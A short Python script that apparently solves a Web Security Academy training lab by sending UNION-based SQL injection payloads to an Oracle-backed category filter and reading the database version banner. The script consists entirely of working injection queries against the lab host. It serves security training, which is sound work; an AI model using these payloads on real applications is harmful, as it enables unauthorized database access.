#!/usr/bin/env python

"""This lab contains an SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query."""

import requests
import sys

lab_id = '0a7f00b8039e4ab3c007018b0071001f' #change based on generated lab page id
base_uri = f"https://{lab_id}.web-security-academy.net/filter?category=" # contains the vulnerable sqli path

query_1 = "'+UNION+SELECT+NULL,NULL+FROM+DUAL--" # Check for the UNION injection with two null columns. Query formatted for oracle database.
uri_1 = base_uri + query_1
r1 = requests.get(uri_1)
if r1.status_code == 200:
    query_2 = "'+UNION+SELECT+banner,NULL+FROM+v$version--"
    uri_2 = base_uri + query_2
    r2 = requests.get(uri_2)
    if "Oracle Database" in r2.text:
        print("solved")
    else: 
        print("nope")
else:
    print("Union query is wrong. Exiting")
    sys.exit(-1)
